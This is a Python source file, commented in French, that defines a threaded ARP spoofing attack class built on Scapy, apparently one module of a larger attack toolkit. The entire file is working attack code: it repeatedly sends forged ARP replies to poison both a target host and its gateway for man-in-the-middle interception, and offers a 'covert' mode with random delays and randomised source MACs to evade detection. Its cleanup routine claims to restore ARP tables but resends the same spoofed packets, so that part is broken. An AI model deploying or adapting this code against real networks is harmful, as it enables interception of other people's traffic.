from scapy.all import *
from scapy.layers.l2 import Ether, ARP  # Import explicite des couches
from scapy.layers.inet import IP
from scapy.volatile import RandMAC  # Import spécifique pour RandMAC
from utils.logger import Logger
import time
import threading
import random
from utils.helpers import validate_ip

class Attack:
    def __init__(self):
        # Initialisation du logger
        self.logger = Logger(name="ARPSpoof").logger
        self.running = False
        self.thread = None

    def setup(self, target_ip, gateway_ip, interface="eth0", covert=False, **kwargs):
        if not validate_ip(target_ip) or not validate_ip(gateway_ip):
            raise ValueError("Adresse IP invalide")
        
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.covert_mode = covert

        if kwargs:
            self.logger.warning(f"Paramètres supplémentaires ignorés: {', '.join(kwargs.keys())}")

    def _send_arp(self, op, psrc, pdst):
        """Envoie un paquet ARP spécifique"""
        # Création du paquet ARP avec les couches correctement référencées
        packet = ARP(
            op=op,         # 1 = request, 2 = reply
            psrc=psrc,     # Adresse IP source
            pdst=pdst,     # Adresse IP destination
            hwdst="ff:ff:ff:ff:ff:ff"  # Adresse MAC broadcast
        )
        
        # Encapsulation dans une trame Ethernet
        eth_frame = Ether() / packet
        
        # Techniques d'évasion en mode furtif
        if self.covert_mode:
            time.sleep(random.uniform(0.5, 2.5))
            eth_frame.src = RandMAC()  # Utilisation correcte de RandMAC
        
        # Envoi du paquet
        sendp(eth_frame, verbose=False, iface=self.interface)  # sendp pour la couche 2

    def _spoof(self):
        """Boucle principale d'attaque"""
        while self.running:
            try:
                # Empoisonne la cible (se fait passer pour la passerelle)
                self._send_arp(2, self.gateway_ip, self.target_ip)
                # Empoisonne la passerelle (se fait passer pour la cible)
                self._send_arp(2, self.target_ip, self.gateway_ip)
                # Délai entre les envois
                time.sleep(1.5 if self.covert_mode else 1)
            except Exception as e:
                self.logger.error(f"Erreur lors de l'envoi ARP: {str(e)}")
                time.sleep(2)

    def execute(self):
        """Démarre l'attaque dans un thread séparé"""
        self.running = True
        self.thread = threading.Thread(target=self._spoof)
        self.thread.daemon = True
        self.thread.start()
        
        self.logger.info("Attaque ARP Spoof démarrée", extra={
            "target": self.target_ip,
            "gateway": self.gateway_ip,
            "covert": self.covert_mode
        })
        
        return {"status": "running"}

    def cleanup(self):
        """Arrêt et restauration des tables ARP"""
        self.logger.info("Arrêt de l'attaque ARP Spoof...")
        self.running = False
        
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=5)
        
        if self.thread.is_alive():
            self.logger.warning("Le thread d'attaque n'a pas pu s'arrêter proprement")
        
        # Restauration des tables ARP
        try:
            self.logger.info("Restauration des tables ARP...")
            self._send_arp(2, self.gateway_ip, self.target_ip)
            self._send_arp(2, self.target_ip, self.gateway_ip)
            time.sleep(1)
            self._send_arp(2, self.gateway_ip, self.target_ip)
            self._send_arp(2, self.target_ip, self.gateway_ip)
        except Exception as e:
            self.logger.error(f"Erreur lors de la restauration ARP: {str(e)}")
        
        self.logger.info("Attaque ARP Spoof complètement arrêtée")